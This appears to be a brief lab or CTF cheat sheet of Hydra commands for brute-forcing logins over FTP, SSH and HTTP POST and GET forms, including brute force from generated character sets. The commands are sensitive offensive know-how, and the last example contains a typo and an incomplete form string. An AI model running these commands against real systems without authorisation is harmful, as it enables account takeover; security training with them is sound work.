## for FTP
* `hydra -l user -P passlist.txt ftp://MACHINE_IP`
---

## for ssh
* `hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh`
> -t 4 :--- 4 threads
---

## for POST-Form

```
sudo hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```





> path :-- web path to login form 

**example** :---

```
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

>F=incorrect :--   value when login failed
---
## without passwordlist bruteforce
`hydra -x `
ex:--
```
hydra -m 0 -a 0 -l user -x 6:6:a site.com http-get-form "/login:username,passowrd:F"
```
> here `-x 6:6:a` 6:6 means size for password , a means use small aplahbets 
```
-x 6:6:a
// for lowercase 
-x 6:6:1 
// for numbers
-x 6:6:A 
//for upper case
-x 6:6:a@%
// add custom 
```
> see more in help
> 